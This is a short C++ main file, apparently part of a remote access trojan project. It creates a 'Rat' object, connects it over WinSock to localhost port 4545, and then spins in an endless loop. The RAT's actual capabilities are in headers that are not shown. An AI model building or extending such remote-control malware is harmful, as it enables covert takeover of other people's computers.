#include <Windows.h>

#include "ICommunicationFactory.h"
#include "IRat.h"

int main()
{
	const auto factory = CreateFactory();

	const std::unique_ptr<IRat> rat = CreateRat(
		factory.get(),
		factory->CreateWinSockConnectionFactory("localhost", 4545));

	//MSG Msg; // msg object to be processed, but actually never is processed
	//while (GetMessage(&Msg, NULL, 0, 0)) // empties console window
	//{
	//	TranslateMessage(&Msg);
	//	DispatchMessage(&Msg);
	//}
	while (true)
	{
		
	}

	return 0;
}
